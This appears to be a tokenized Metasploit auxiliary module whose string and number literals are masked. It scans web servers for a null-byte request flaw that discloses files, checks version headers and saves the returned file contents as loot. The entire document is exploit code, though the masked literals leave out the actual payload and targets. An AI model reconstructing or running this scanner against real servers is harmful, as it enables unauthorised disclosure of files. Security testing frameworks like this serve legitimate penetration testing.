require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def target_url uri = normalize_uri ( datastore [ <str> ] ) <str> vhost <str> rport <str> datastore [ <str> ] <str> end def run_host ( ip ) uri = normalize_uri ( datastore [ <str> ] ) path_save = datastore [ <str> ] vuln_versions = [ <str> ] nullbytetxt = <str> begin res = send_request_raw ( { <str> = > <str> , <str> = > <str> uri <str> nullbytetxt <str> , } , <int> ) if res . nil? print_error ( <str> target_url <str> ) return end version = res . headers [ <str> ] if vuln_versions . include? ( version ) print_good ( <str> target_url <str> version <str> ) if ( res and res . code == <int> ) print_good ( <str> target_url <str> uri <str> ) p = store_loot ( <str> , <str> , rhost , res . body , path_save ) print_status ( <str> target_url <str> p <str> ) else print_error ( <str> vhost <str> rport <str> res . code <str> ) return end else if version =~ <str> print_error ( <str> target_url <str> version <str> ) else print_error ( <str> target_url <str> ) end return end rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout rescue :: Timeout :: Error , :: Errno :: EPIPE end end end 
